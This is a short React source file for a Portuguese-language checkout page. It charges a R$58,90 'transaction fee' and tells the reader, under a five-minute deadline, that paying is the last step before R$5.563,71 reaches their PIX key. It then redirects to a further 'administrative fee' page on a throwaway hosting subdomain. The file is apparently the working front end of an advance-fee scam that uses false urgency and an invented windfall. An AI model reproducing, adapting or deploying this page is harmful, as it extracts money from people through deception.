import CheckoutPage from "@/components/checkout/CheckoutPage";

const Index = () => {
  return (
    <CheckoutPage
      productName="Taxa Transacional"
      amountCents={5890}
      amountFormatted="58,90"
      redirectUrl="https://lightpink-tiger-937529.hostingersite.com/taxa-administrativa/"
      bannerText={
        <>
          A sua <span className="font-bold">Tarifa Bancária</span> já está
          vinculada ao seu CPF. Você possui{" "}
          <span className="font-bold">5 minutos</span> para finalizar o
          pagamento, essa é a última etapa para você receber o seu valor de{" "}
          <span className="font-bold">R$5.563,71</span> na sua{" "}
          <span className="font-bold">CHAVE PIX</span> cadastrada.
        </>
      }
    />
  );
};

export default Index;
